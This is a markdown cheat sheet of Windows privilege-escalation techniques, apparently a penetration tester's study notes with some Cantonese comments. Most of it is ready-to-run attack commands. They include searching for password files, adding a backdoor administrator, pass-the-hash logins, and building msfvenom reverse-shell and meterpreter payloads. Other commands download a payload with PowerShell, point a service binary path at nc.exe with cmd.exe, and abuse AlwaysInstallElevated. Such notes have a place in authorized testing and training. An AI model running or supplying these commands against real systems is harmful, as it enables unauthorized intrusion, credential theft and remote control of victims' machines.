# Windows Privilege Esculation

## Kernel exploit
```
./windows-exploit-suggester.py --database 2020-02-02-mssb.xls --systeminfo sysinfo.txt
```

## Searching

```
# Finding a file
dir <file name> /s /p
dir /s/b *pass* == *key* == *vnc* == *.config*

# String Searching
findstr /si pass *.xml *.ini *.txt
```

## Adding new user
```
net user anon p3nT3st! /add;
net localgroup administrators anon /add
net localgroup "Remote Desktop Users" user1  /add
```

## Login with Creds
```
# 要有smb write access
psexec.py test:test@10.11.1.75 cmd   

winexe -U 'admin%password' --system //192.168.1.2 cmd.exe

pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```
## Information Gathering

```
systeminfo

# what os we are connected to
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 

# hostname
hostname  

# List users
net users
net user user1

# active network connections
netstat -ano

# scheduled tasks
schtasks /query /fo LIST /v  

# links running processes to started services  
tasklist /SVC  

# installed patches
wmic qfe get Caption,Description,HotFixID,InstalledOn 

# find files that contain ‘password’ in the filename
dir /s *password* 

# check 係咪admin groups
net user /domain alex

# 搵唔係windows自己install ge services, 留意path 同有無quotes
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
```

## Potato

```
# Checking if there is SeImpersonatePrivilege
whoami /priv
```

## Unquoted Path

```
# find unquoted service path 
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# check permission of a directory
icacls "C:\Program Files\Program" 
  
# create payload ( only stageless payload works)
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.6.12 LPORT=443 -f exe -o Advanced.exe

# check configurAtion  
sc qc "Some Vulnerable Service"
要留意個service係咪開機auto start ,同埋係咪run as super user

# transfer payload
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.1.2/Wise.exe', 'C:\Program Files (x86)\Wise\Wise.exe')"

# stop & restart service
sc stop [service name]
sc start [service name] 
or
net stop
net start

# reboot machine
shutdown /r /t 0
```

## Modifiable binary path
```
# display services that can be modified by an authenticated user type
accesschk.exe -uwcqv "Authenticated Users" * /accepteula 

A service with write permissions for an authenticated user will look like the following:
RW [service name] SERVICE_ALL_ACCESS 

accesschk.exe -ucqv [sevice_name]

# show the service properties
sc qc [service name] 

# change binary path [ option 1 ]
sc config [service name] binpath= "malicious executable path" 
sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"  
sc config upnphost obj= ".\LocalSystem" password= ""  

# use the binary path to add a new user and grant administrator rights [ option 2 ]
sc config [service name] binpath= "net user admin password /add" 

# restart service
sc stop [service name]
sc start [service name] 
net start upnphost  
```

## AlwaysInstallElevated
```
# check if two registry entries were setted to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 

# payload - add user
msfvenom -p windows/adduser USER=admin PASS=password -f msi -o filename.msi 

# payload - reverse shell
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP]
LPORT=443 -f msi -o filename.msi 

# execute the msi installer file
msiexec /quiet /qn /i C:\Users\filename.msi
```

## Unattended files

```
Unattended files are most likely found in one of the following directories:
- C:\Windows\Panther\
- C:\Windows\Panther\Unattend\
- C:\Windows\System32\
- C:\Windows\System32\sysprep\

Search the directories for the following files:
- Unattend.xml
- Unattended.xml
- Unattend.txt
- sysprep.xml
- sysprep.inf 
```

## Scheduled Task

```powershell
Get-ScheduledTask
```
